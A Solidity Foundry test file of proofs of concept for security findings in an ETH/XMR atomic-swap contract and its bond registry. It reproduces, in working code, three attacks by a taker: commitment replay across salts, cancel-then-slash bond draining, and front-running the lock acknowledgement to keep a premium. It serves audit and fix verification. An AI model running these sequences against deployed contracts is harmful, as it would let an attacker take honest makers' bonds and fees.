// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import {SecBase} from "./Base.sol";
import {XmrSwapV3} from "../../src/XmrSwapV3.sol";
import {SeshRegistry} from "../../src/registry/SeshRegistry.sol";
import {ExitLease} from "../../src/exits/ExitLease.sol";
import {MockUSDC} from "../../src/MockUSDC.sol";

/// Proofs of concept for the findings in SECURITY-FUZZ.md. Each test PASSES
/// when the problem is present (it shows the attacker's gain).
contract SecurityPoC is SecBase {
    XmrSwapV3 v3;
    SeshRegistry reg;
    ExitLease el;
    MockUSDC usdc;

    uint256 makerPk = 0x3A4E5;
    address maker;
    address taker = address(0xA11CE);
    address claimer = address(0xC1A1);
    uint256 lid;
    uint64 constant D1 = 1 hours;
    uint64 constant D2 = 1 hours;
    uint64 constant G = 30 minutes;
    string constant MSESH = "maker1.sesh";

    function setUp() public {
        vm.warp(1_000_000);
        (v3, reg, el, usdc) = deployAll();
        maker = vm.addr(makerPk);
        vm.deal(maker, 10 ether);
        vm.deal(taker, 10 ether);
        vm.prank(maker);
        lid = reg.register{value: MAKER_BOND}(MSESH, "maker", "");
    }

    function _lock(uint256 value, bytes32 salt) internal returns (XmrSwapV3.Swap memory s, bytes32 id) {
        s = XmrSwapV3.Swap(
            taker, claimer, BOB_K, ALICE_K,
            uint64(block.timestamp) + D1, uint64(block.timestamp) + D1 + D2, G,
            address(0), value, 0, salt
        );
        vm.prank(taker);
        id = v3.lock{value: value}(claimer, BOB_K, ALICE_K, D1, D2, G, address(0), value, 0, salt);
    }

    function _commitment(uint256 value) internal view returns (SeshRegistry.Commitment memory c) {
        c = SeshRegistry.Commitment(
            lid, taker, claimer, BOB_K, address(0), value, 1, MIN_PEN, ATTEST, uint64(block.timestamp) + 15 minutes
        );
    }

    function _sign(SeshRegistry.Commitment memory c) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        return vm.sign(makerPk, reg.commitmentDigest(c));
    }

    /// FINDING H-1: one signed Commitment can be recorded against many V3 swaps.
    /// The commitment binds claimer + claimKey + value but not the V3 swap id
    /// (salt, t1, t2, grace, refundKey, premium), so the taker locks the same
    /// terms N times with different salts and commits each one. The maker only
    /// knows about (and acks) one swap; the rest get slashed.
    function test_PoC_H1_CommitmentReplayAcrossSalts() public {
        uint256 value = 0.001 ether;
        SeshRegistry.Commitment memory c = _commitment(value);
        (uint8 v, bytes32 r, bytes32 ss) = _sign(c); // maker signs ONCE

        uint256 n = 5;
        bytes32[] memory ids = new bytes32[](n);
        XmrSwapV3.Swap[] memory sw = new XmrSwapV3.Swap[](n);
        for (uint256 i = 0; i < n; i++) {
            (sw[i], ids[i]) = _lock(value, bytes32(i + 1));
            reg.commit(sw[i], c, v, r, ss); // same signature every time
        }
        assertEq(reg.listing(lid).openCommits, n);
        assertEq(reg.listing(lid).reserved, n * MIN_PEN);

        // Honest maker acks the one swap it negotiated.
        (v, r, ss) = vm.sign(makerPk, reg.ackDigest(ids[0], lid));
        reg.ack(ids[0], v, r, ss);

        // Taker takes its ETH back from the extra swaps (cancel + refund before t1).
        for (uint256 i = 1; i < n; i++) {
            vm.startPrank(taker);
            v3.cancelIntent(sw[i]);
            v3.refund(sw[i], ALICE_S);
            vm.stopPrank();
        }
        vm.warp(block.timestamp + ATTEST);
        uint256 before = taker.balance;
        for (uint256 i = 1; i < n; i++) reg.slash(ids[i]);
        assertEq(taker.balance - before, (n - 1) * MIN_PEN, "taker collected n-1 penalties");
        assertEq(reg.listing(lid).bond, MAKER_BOND - (n - 1) * MIN_PEN);
    }

    /// FINDING H-2: taker cancels before the maker can lock XMR, then slashes.
    /// The maker daemon only locks XMR while the V3 swap is PENDING and only acks
    /// after its XMR lock (swapd/internal/swap/maker.go MEthLocked, and
    /// api/registry.go ack loop). slash() allows CANCELLING / REFUNDED, so a
    /// taker that locks, commits and cancels in the same block keeps all its ETH
    /// and takes the penalty. Repeatable until the maker's free bond is gone.
    function test_PoC_H2_CancelThenSlash() public {
        uint256 value = 0.001 ether;
        uint256 start = taker.balance;
        vm.prank(maker);
        reg.topUp{value: 0.008 ether}(lid); // a maker usually bonds more than the minimum
        uint256 bond0 = reg.listing(lid).bond;
        uint256 rounds;
        // Commits stop only once the bond drops below makerMinBond.
        while (reg.listing(lid).bond >= MAKER_BOND) {
            uint256 i = rounds++;
            SeshRegistry.Commitment memory c = _commitment(value);
            c.claimKey = BOB_K; // fresh claimer per swap in real life; same here is fine
            (uint8 v, bytes32 r, bytes32 ss) = _sign(c);
            (XmrSwapV3.Swap memory s, bytes32 id) = _lock(value, bytes32(1000 + i));
            reg.commit(s, c, v, r, ss);
            vm.startPrank(taker);
            v3.cancelIntent(s); // same block: the maker never sees PENDING after its confirmations
            v3.refund(s, ALICE_S);
            vm.stopPrank();
            vm.warp(block.timestamp + ATTEST);
            reg.slash(id);
        }
        assertEq(taker.balance - start, bond0 - reg.listing(lid).bond, "every slashed wei went to the taker");
        assertGt(taker.balance - start, 0.008 ether, "taker took everything above the minimum bond");
        emit log_named_uint("rounds", rounds);
    }

    /// FINDING M-1: the premium can be dodged by front-running ackLocked.
    /// The taker can see the maker's XMR arrive at the shared address (it holds
    /// the shared view key). It then sends cancelIntent before the maker's
    /// ackLocked is mined; ackLocked reverts (stage is no longer PENDING) and
    /// the refund returns the premium to the taker. The maker's XMR is safe
    /// (refund reveals the key share), but the premium meant to pay for this
    /// griefing is never paid.
    function test_PoC_M1_AckFrontRunKeepsPremium() public {
        uint256 bobPk = 0xB0B5EC;
        address bob = vm.addr(bobPk);
        address sink = address(0x5111C);
        uint256 value = 1 ether;
        uint256 premium = 0.01 ether;
        XmrSwapV3.Swap memory s = XmrSwapV3.Swap(
            taker, bob, BOB_K, ALICE_K, uint64(block.timestamp) + D1, uint64(block.timestamp) + D1 + D2, G,
            address(0), value, premium, bytes32(uint256(7))
        );
        vm.prank(taker);
        bytes32 id = v3.lock{value: value + premium}(bob, BOB_K, ALICE_K, D1, D2, G, address(0), value, premium, s.salt);
        // maker locks XMR off-chain and signs the ack ...
        (uint8 v, bytes32 r, bytes32 ss) = vm.sign(bobPk, v3.ackDigest(id, sink));
        // ... taker front-runs it
        vm.prank(taker);
        v3.cancelIntent(s);
        vm.expectRevert(XmrSwapV3.WrongStatus.selector);
        v3.ackLocked(s, sink, v, r, ss);
        uint256 before = taker.balance;
        vm.prank(taker);
        v3.refund(s, ALICE_S);
        assertEq(taker.balance - before, value + premium, "premium came back to the taker");
        assertEq(sink.balance, 0);
    }
}
